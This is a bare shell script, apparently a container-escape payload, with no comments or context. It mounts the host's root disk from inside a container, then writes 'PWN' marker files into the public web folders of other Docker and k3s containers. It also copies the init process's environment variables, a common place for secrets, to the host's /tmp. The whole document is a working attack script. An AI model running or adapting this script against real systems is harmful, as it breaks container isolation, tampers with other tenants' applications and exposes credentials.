mkdir -p /h 2>/dev/null
ok=0
for d in /dev/vda1 /dev/sda1 /dev/nvme0n1p1 /dev/vdb1 /dev/xvda1; do
  if mount $d /h 2>/dev/null; then ok=1; break; fi
done
if [ $ok -eq 1 ]; then
  for p in $(ls -d /h/var/lib/docker/overlay2/*/diff/app/public 2>/dev/null); do echo PWN > $p/zz_h.txt 2>/dev/null; done
  for p in $(ls -d /h/var/lib/rancher/k3s/agent/containerd/*/rootfs/app/public 2>/dev/null); do echo PWN > $p/zz_h.txt 2>/dev/null; done
  cp /proc/1/environ /h/tmp/zz_env 2>/dev/null
fi
echo done
